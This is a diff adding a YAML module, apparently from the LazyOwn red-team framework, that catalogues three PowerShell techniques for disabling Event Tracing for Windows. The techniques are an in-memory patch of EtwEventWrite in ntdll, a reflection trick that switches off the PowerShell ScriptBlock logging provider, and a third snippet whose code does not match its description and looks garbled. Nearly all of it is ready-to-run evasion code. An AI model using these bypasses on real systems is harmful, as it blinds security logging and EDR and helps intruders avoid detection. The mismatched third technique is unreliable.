@@ -1,0 +1,94 @@
+name: etw_bypass
+version: "1.0"
+description: >
+  ETW (Event Tracing for Windows) bypass techniques to evade logging of .NET assemblies,
+  PowerShell script blocks, and process creation events by security products.
+author: "LazyOwn RedTeam"
+category: "evasion"
+phase: "post_exploitation"
+permissions:
+  - shell
+  - memory
+platforms:
+  - windows
+enabled: true
+tags:
+  - etw
+  - bypass
+  - powershell
+  - evasion
+  - edr_bypass
+  - logging
+
+techniques:
+  - name: "Patch EtwEventWrite — In-Memory Hook"
+    description: >
+      Patches the EtwEventWrite function in ntdll.dll to return 0 (SUCCESS) without writing events.
+      This is a ring3 hook that prevents ETW providers from logging events.
+      Highly effective but may trigger kernel callbacks on newer Windows builds.
+    requires_admin: false
+    command: |
+      $Win32 = Add-Type -memberDefinition @"
+      [DllImport("kernel32")]
+      public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+      [DllImport("kernel32")]
+      public static extern IntPtr LoadLibrary(string name);
+      [DllImport("kernel32")]
+      public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+      "@ -name "Win32" -namespace Win32Functions -passthru
+      $ntdll = [Win32Functions.Win32]::LoadLibrary("ntdll.dll")
+      $etwAddr = [Win32Functions.Win32]::GetProcAddress($ntdll, "EtwEventWrite")
+      $oldProtect = 0
+      [Win32Functions.Win32]::VirtualProtect($etwAddr, [UIntPtr]1, 0x40, [ref]$oldProtect)
+      $retPatch = [Byte[]] (0xC3)
+      [System.Runtime.InteropServices.Marshal]::Copy($retPatch, 0, $etwAddr, 1)
+    cleanup: >
+      Restart PowerShell session to restore original function.
+    references:
+      - "https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/"
+      - "https://blog.xpnsec.com/hiding-your-dotnet-etw/"
+
+  - name: "Set ETW Provider to 0 — PowerShell Reflection"
+    description: >
+      Uses .NET reflection to locate EtwEventProvider and set its m_enabled field to 0 (disabled).
+      Does not require memory patching — uses pure managed code.
+      Specifically targets the PowerShell ETW provider used for ScriptBlock logging.
+    requires_admin: false
+    command: |
+      $providers = [System.Management.Automation.Tracing.PSEtwLogProvider].GetField('etwProvider','NonPublic,Static')
+      if ($providers -ne $null) {
+        $etwProvider = $providers.GetValue($null)
+        $enabledField = $etwProvider.GetType().GetField('m_enabled','NonPublic,Instance')
+        if ($enabledField -ne $null) {
+          $enabledField.SetValue($etwProvider, 0)
+        }
+      }
+    cleanup: >
+      $providers.GetValue($null).GetType().GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider, 1)
+    references:
+      - "https://posts.specterops.io/unrestricted-0bf856d67eb0"
+      - "https://www.pwndefend.com/2020/12/19/silencing-etw-with-pure-powershell/"
+
+  - name: ".NET ETW Bypass via Environment.Exit — Graceful Termination Evasion"
+    description: >
+      Prevents ETW event flushing by calling Environment.Exit instead of allowing normal
+      process termination. ETW providers flush on normal shutdown; this bypasses that flush.
+      Combined with in-memory patching for full coverage.
+    requires_admin: false
+    command: |
+      [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue(
+        [System.Diagnostics.Eventing.EventProvider].GetConstructors('NonPublic,Instance')[0].Invoke(@([System.Guid]::NewGuid())),
+        0
+      )
+      function Invoke-EtwBypass {
+        $provider = New-Object System.Diagnostics.Eventing.EventProvider([System.Guid]::NewGuid())
+        $provider.GetType().GetField('m_enabled', 'NonPublic, Instance').SetValue($provider, 0)
+        $writer = [System.Diagnostics.Eventing.EventDescriptor]::new(0, 0, 0, 0, 0, 0, 0)
+        $result = $provider.GetType().GetMethod('WriteEvent', [ref]$writer.GetType()).Invoke($provider, @($writer, [byte[]]@()))
+        return $result
+      }
+    cleanup: >
+      [System.GC]::Collect(); [System.GC]::WaitForPendingFinalizers()
+    references:
+      - "https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/"
+      - "https://github.com/med0x2e/SigFlip"
